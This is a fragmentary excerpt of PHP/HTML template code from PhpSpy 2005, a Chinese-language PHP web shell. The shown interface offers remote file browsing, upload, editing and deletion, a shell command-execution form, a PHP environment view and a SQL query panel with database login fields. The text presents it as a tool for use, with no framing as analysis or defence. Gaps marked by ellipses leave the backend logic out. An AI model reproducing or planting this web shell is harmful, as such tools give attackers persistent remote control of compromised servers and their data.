...
<table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td width="375" align="right" nowrap><b><?php echo $_SERVER['HTTP_HOST']?></b></td>
    <td width="10" align="center" nowrap><b>:</b></td>
    <td width="375" nowrap><b><?php echo $_SERVER['REMOTE_ADDR']?></b></td>
  </tr>
  <tr>
    <td colspan="3" align="center" nowrap><a href="?action=logout">注销会话</a> | <a href="?action=dir">返回 PhpSpy 目录</a> | <a href="?action=phpenv">PHP环境变量</a><?php echo $phpinfo?><?php echo $shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="http://www.4ngel.net" target="_blank" title="下载此程序">Version 2005</a></td>
  </tr>
</table>
...
<table width="760" border="0" cellpadding="0">
 <form action="" method="GET">
  <tr>
    <td><p>程序路径:<?php echo $pathname?><br>当前目录(<?php echo $dir_writeable?>,<?php echo substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?php echo $nowpath?>
        <br>跳转目录:
 ...
 <form action="?dir=<?php echo urlencode($dir)?>" method="POST" enctype="multipart/form-data">
  <tr>
    <td colspan="2">上传文件到当前目录:
      <input name="uploadmyfile" type="file" class="INPUT">	<input type="submit" name="uploadfile" class="INPUT" value="确定"><input type="hidden" name="uploaddir" value="<?php echo $dir?>"></td>
  </tr>
  </form>
  <form action="?action=editfile&dir=<?php echo urlencode($dir)?>" method="POST">
  <tr>
...
@closedir($dirs); 
?>
<tr class="<?php echo getrowbg()?>">
  <td nowrap colspan="6" align="right"><?php echo $dir_i?> 个目录 / <?php echo $file_i?> 个文件</td>
    </tr>
  </table></td>
</tr>
</table>
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">新建/编辑文件 [<a href="?dir=<?php echo urlencode($dir)?>">返回</a>]</td>
  </tr>
...
value="<?php echo $filename?>"> 输入新文件名则建立新文件</td>
  </tr>  
  <tr class="firstalt">
    <td align="center"><textarea name="filecontent" cols="100" rows="20"><?php echo $contents?></textarea></td>
  </tr>  
  <tr class="secondalt">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <form action="?action=shell&dir=<?php echo urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">
	  选择执行函数:
	  ...
	  输入命令:
      <input type="text" name="command" size="60" value="<?php echo $_POST['command']?>" class="input">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <form action="?dir=<?php echo urlencode($dir)?>" method="POST">
  <tr class="firstalt">
    <td align="center">删除 <input name="deldir" type="text" value="<?php echo $deldir?>" class="input" readonly> 目录</td>
  </tr>  
  <tr class="secondalt">
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <tr class="secondalt">
    ...
    <input name="servername" type="text" class="INPUT" value="<?php echo $servername?>"> 
    User:
    <input name="dbusername" type="text" class="INPUT" size="15" value="<?php echo $dbusername?>">
    Pass:
    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?php echo $dbpassword?>">
    DB:
    <input name="dbname" type="text" class="INPUT" size="15" value="<?php echo $dbname?>">
